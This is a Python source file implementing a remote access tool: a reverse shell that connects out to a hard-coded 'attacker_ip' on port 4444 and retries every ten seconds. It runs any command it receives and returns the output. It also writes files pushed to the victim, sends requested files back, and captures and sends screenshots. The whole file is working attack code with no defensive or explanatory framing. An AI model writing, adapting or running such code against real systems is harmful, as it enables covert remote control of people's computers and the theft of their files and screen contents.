import socket
import subprocess
import os
from time import sleep
from pyautogui import screenshot

def reverse_shell():

    attacker_ip = "192.168.1.26"
    attacker_port = 4444

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((attacker_ip, attacker_port))
            while True:
                command = s.recv(1024)
                command = command.decode()

                if command == "":
                    break
                elif command == "exit":
                    s.close()
                    return
                elif command.startswith("upload"):
                    x, filename = command.split(' ', 1)
                    filename = filename.strip()
                    upload_file(s, filename)
                elif command.startswith("download"):
                    x, filename = command.split(' ', 1)
                    filename = filename.strip()
                    print(filename)
                    download_file(s, filename)
                elif command.startswith("screenshot"):
                    take_screenshot(s, "image.png")
                else:
                    output = subprocess.getoutput(command)
                    if output:
                        s.send((output + '\n').encode())

        except Exception as e:
            print("ERROR: Retrying in 10 sec")
            sleep(10)


def upload_file(conn, filename):
    try:
        with open(filename, "wb") as file:
            while True:
                data = conn.recv(1024)
                print(f"[DEBUG] Received: {data}")
                if data.strip() == b'END':
                    print("[DEBUG] Received END")
                    break
                file.write(data)

        conn.send(b"Upload complete\n")

    except Exception as e:
        conn.send(f"Upload failed: {e}\n".encode())
        print(f"[ERROR] Upload failed: {e}")



def download_file(conn, filepath):
    normalized_path = os.path.normpath(filepath)

    if os.path.exists(normalized_path):
        with open(normalized_path, "rb") as file:
            conn.sendall(file.read())
    else:
        conn.send(b"File not found")


def take_screenshot(conn, filename):
    image = screenshot(filename)
    with open(filename, 'rb') as file:
        conn.sendall(file.read())


if __name__ == "__main__":
    reverse_shell()